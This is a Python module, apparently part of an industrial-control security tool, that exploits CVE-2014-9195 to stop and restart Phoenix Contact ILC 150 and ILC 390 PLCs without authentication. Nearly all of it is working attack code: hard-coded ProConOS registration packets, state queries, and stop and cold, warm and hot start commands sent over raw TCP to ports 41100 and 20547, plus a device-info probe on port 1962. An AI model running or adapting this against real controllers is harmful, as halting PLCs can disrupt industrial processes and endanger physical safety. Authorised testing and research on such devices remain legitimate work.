"""Phoenix Contact PLC control via ProConOS protocol.

Supports ILC 150 ETH (TCP port 41100) and ILC 390 (TCP port 20547).
Also performs device info retrieval via port 1962.

CVE-2014-9195: Remote control without authentication.
Ported from Python 2 to Python 3.
"""

from __future__ import annotations

import socket
import time

from icstool.core.validation import require_ipv4

INFO_PORT = 1962
CONTROL_PORT_ILC150 = 41100
CONTROL_PORT_ILC390 = 20547
DEFAULT_TIMEOUT = 5

# ProConOS service registration packets (shared by ILC150 and ILC390)
_INIT_MONITOR_PACKETS = [
    "0100000000002f00000000000000cfff4164652e52656d6f74696e672e53657276696365732e4950726f436f6e4f53436f6e74726f6c536572766963653200",
    "0100000000002e0000000000000000004164652e52656d6f74696e672e53657276696365732e4950726f436f6e4f53436f6e74726f6c5365727669636500",
    "010000000000290000000000000000004164652e52656d6f74696e672e53657276696365732e49446174614163636573735365727669636500",
    "0100000000002a00000000000000d4ff4164652e52656d6f74696e672e53657276696365732e49446576696365496e666f536572766963653200",
    "010000000000290000000000000000004164652e52656d6f74696e672e53657276696365732e49446576696365496e666f5365727669636500",
    "0100000000002500000000000000d9ff4164652e52656d6f74696e672e53657276696365732e49466f726365536572766963653200",
    "010000000000240000000000000000004164652e52656d6f74696e672e53657276696365732e49466f7263655365727669636500",
    "0100000000003000000000000000ceff4164652e52656d6f74696e672e53657276696365732e4953696d706c6546696c65416363657373536572766963653300",
    "010000000000300000000000000000004164652e52656d6f74696e672e53657276696365732e4953696d706c6546696c65416363657373536572766963653200",
    "0100000000002a00000000000000d4ff4164652e52656d6f74696e672e53657276696365732e49446576696365496e666f536572766963653200",
    "010000000000290000000000000000004164652e52656d6f74696e672e53657276696365732e49446576696365496e666f5365727669636500",
    "0100000000002a00000000000000d4ff4164652e52656d6f74696e672e53657276696365732e4944617461416363657373536572766963653300",
    "010000000000290000000000000000004164652e52656d6f74696e672e53657276696365732e49446174614163636573735365727669636500",
    "0100000000002a00000000000000d4ff4164652e52656d6f74696e672e53657276696365732e4944617461416363657373536572766963653200",
    "0100000000002900000000000000d5ff4164652e52656d6f74696e672e53657276696365732e49427265616b706f696e745365727669636500",
    "0100000000002800000000000000d6ff4164652e52656d6f74696e672e53657276696365732e4943616c6c737461636b5365727669636500",
    "010000000000250000000000000000004164652e52656d6f74696e672e53657276696365732e494465627567536572766963653200",
    "0100000000002f00000000000000cfff4164652e52656d6f74696e672e53657276696365732e4950726f436f6e4f53436f6e74726f6c536572766963653200",
    "0100000000002e0000000000000000004164652e52656d6f74696e672e53657276696365732e4950726f436f6e4f53436f6e74726f6c5365727669636500",
    "0100000000003000000000000000ceff4164652e52656d6f74696e672e53657276696365732e4953696d706c6546696c65416363657373536572766963653300",
    "010000000000300000000000000000004164652e52656d6f74696e672e53657276696365732e4953696d706c6546696c65416363657373536572766963653200",
    "0100020000000e0003000300000000000500000012401340130011401200",
]

# ILC 390 specific init packets
_INIT_MONITOR2_PACKETS = [
    "cc01000dc0010000d517",
    "cc01000b4002000047ee",
    "cc01005b40031c00010000001c0000000100000002000000000000000000000000000000d79a",
    "cc01005b40041c00010000001c0000000100000004000000800000000000000000000000ea43",
    "cc01000640050000361e",
    "cc0100074006100026750000000000000000000000000000c682",
]

# Query and keepalive packets
_QUERY_PACKET = "010002000000080003000300000000000200000002400b40"
_KEEPALIVE_PACKET = (
    "0100020000001c0003000300000000000c000000"
    "07000500060008001000020011000e000f000d0016401600"
)

# ILC150 control commands
_STOP_CMD = "01000200000000000100070000000000"
_COLD_START_CMD = "010002000000020001000600000000000100"
_WARM_START_CMD = "010002000000020001000600000000000200"
_HOT_START_CMD = "010002000000020001000600000000000300"

# ILC390 state-check packets
_ILC390_STATE_PACKETS = [
    "cc01000f40070000eafa",
    "cc01000f400800002db0",
    "cc01000f40090000f1ea",
    "cc01000f400a00009505",
    "cc01000f400b0000495f",
    "cc01000f400c00004cd3",
    "cc01000f400d00009089",
]


def _send_recv(sock: socket.socket, hex_data: str) -> bytes:
    """Send hex data and receive response."""
    sock.send(bytes.fromhex(hex_data.replace(" ", "")))
    return sock.recv(4096)


def get_device_info(target_ip: str) -> dict | None:
    """Retrieve PLC type, firmware version, and build info.

    Args:
        target_ip: IPv4 address of the PLC.

    Returns:
        Dictionary with plc_type, firmware, build, or None.
    """
    require_ipv4(target_ip)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(DEFAULT_TIMEOUT)

    try:
        sock.connect((target_ip, INFO_PORT))
    except (socket.timeout, ConnectionRefusedError) as exc:
        print(f"Cannot connect to {target_ip}:{INFO_PORT}: {exc}")
        return None

    try:
        resp = _send_recv(
            sock,
            "0101001a005e000000000003000c"
            "494245544830314e305f4d00",
        )
        code = resp.hex()[34:36]

        _send_recv(
            sock,
            "01050016005f000008ef00"
            + code
            + "00000022000402950000",
        )
        ret = _send_recv(
            sock,
            "0106000e00610000881100" + code + "0400",
        )

        plc_type = ret[30:50].decode(errors="replace").strip("\x00")
        firmware = ret[66:70].decode(errors="replace").strip("\x00")
        build = ret[79:100].decode(errors="replace").strip("\x00")

        # Complete the info handshake
        _send_recv(
            sock,
            "0105002e00630000000000"
            + code
            + "00000023001c02b0000c0000055b4433325d"
            "0b466c617368436865636b3101310000",
        )
        _send_recv(
            sock,
            "0106000e0065ffffff0f00" + code + "0400",
        )
        _send_recv(
            sock,
            "010500160067000008ef00"
            + code
            + "00000024000402950000",
        )
        _send_recv(
            sock,
            "0106000e0069ffffff0f00" + code + "0400",
        )
        _send_recv(
            sock,
            "0102000c006bffffff0f00" + code,
        )
    except Exception as exc:
        print(f"Error during info retrieval: {exc}")
        sock.close()
        return None

    sock.shutdown(socket.SHUT_RDWR)
    sock.close()

    result = {
        "plc_type": plc_type,
        "firmware": firmware,
        "build": build,
    }
    print(f"PLC Type: {plc_type}")
    print(f"Firmware: {firmware}")
    print(f"Build:    {build}")
    return result


def query_state_ilc150(
    target_ip: str,
    control_port: int = CONTROL_PORT_ILC150,
) -> str:
    """Query the current PLC state via ProConOS on port 41100.

    Args:
        target_ip: IPv4 address of the PLC.
        control_port: TCP port (41100 for ILC150).

    Returns:
        State string: "Running", "Stop", "On", or "Unknown".
    """
    require_ipv4(target_ip)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(DEFAULT_TIMEOUT)
    sock.connect((target_ip, control_port))

    for pkt in _INIT_MONITOR_PACKETS:
        _send_recv(sock, pkt)

    ret = _send_recv(sock, _QUERY_PACKET).hex()
    sock.close()

    state_byte = ret[48:50] if len(ret) > 50 else ""
    state_map = {"03": "Running", "07": "Stop", "00": "On"}
    return state_map.get(state_byte, f"Unknown ({state_byte})")


def query_state_ilc390(target_ip: str) -> str:
    """Query the current PLC state via ILC390 protocol on port 20547.

    Args:
        target_ip: IPv4 address of the PLC.

    Returns:
        State string: "Running" or "Stopped".
    """
    require_ipv4(target_ip)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(DEFAULT_TIMEOUT)
    sock.connect((target_ip, CONTROL_PORT_ILC390))

    for pkt in _INIT_MONITOR2_PACKETS:
        _send_recv(sock, pkt)

    state = "Running"
    for pkt in _ILC390_STATE_PACKETS[:2]:
        resp = _send_recv(sock, pkt)
        if resp.hex()[-4:] in ("9759", "5703"):
            state = "Stopped"

    for pkt in _ILC390_STATE_PACKETS[2:]:
        _send_recv(sock, pkt)

    sock.close()
    return state


def control_ilc150(
    target_ip: str,
    action: str = "stop",
    start_type: str = "cold",
) -> str:
    """Control an ILC 150/RFC 430 PLC (start/stop).

    Args:
        target_ip: IPv4 address of the PLC.
        action: "stop" or "start".
        start_type: "cold", "warm", or "hot" (for start).

    Returns:
        New PLC state string.
    """
    require_ipv4(target_ip)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(DEFAULT_TIMEOUT)
    sock.connect((target_ip, CONTROL_PORT_ILC150))

    for pkt in _INIT_MONITOR_PACKETS:
        _send_recv(sock, pkt)

    if action == "stop":
        print("Sending STOP command...")
        _send_recv(sock, _STOP_CMD)
    else:
        start_map = {
            "cold": _COLD_START_CMD,
            "warm": _WARM_START_CMD,
            "hot": _HOT_START_CMD,
        }
        cmd = start_map.get(start_type, _COLD_START_CMD)
        print(f"Sending {start_type.upper()} START command...")
        _send_recv(sock, cmd)

    # Keepalive + query to verify new state
    _send_recv(sock, _KEEPALIVE_PACKET)
    _send_recv(sock, _KEEPALIVE_PACKET)
    time.sleep(0.5)

    ret = _send_recv(sock, _QUERY_PACKET).hex()
    sock.close()

    state_byte = ret[48:50] if len(ret) > 50 else ""
    state_map = {"03": "Running", "07": "Stop", "00": "On"}
    new_state = state_map.get(state_byte, f"Unknown ({state_byte})")
    print(f"PLC state: {new_state}")
    return new_state


def control_ilc390(
    target_ip: str,
    action: str = "stop",
) -> str:
    """Control an ILC 390 PLC (start/stop).

    Args:
        target_ip: IPv4 address of the PLC.
        action: "stop" or "start".

    Returns:
        New PLC state string.
    """
    require_ipv4(target_ip)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(DEFAULT_TIMEOUT)
    sock.connect((target_ip, CONTROL_PORT_ILC390))

    for pkt in _INIT_MONITOR2_PACKETS:
        _send_recv(sock, pkt)

    state = "Running"
    for pkt in _ILC390_STATE_PACKETS[:7]:
        resp = _send_recv(sock, pkt)
        if resp.hex()[-4:] in ("9759", "5703"):
            state = "Stopped"

    if action == "stop":
        print("Sending STOP via ILC390 protocol...")
        _send_recv(sock, "cc 01 00 01 40 0e 00 00 4c 07")
    else:
        print("Sending START via ILC390 protocol...")
        _send_recv(sock, "cc 01 00 04 40 0e 00 00 18 21")

    sock.shutdown(socket.SHUT_RDWR)
    sock.close()

    new_state = "Stopped" if action == "stop" else "Running"
    print(f"PLC state: {new_state}")
    return new_state
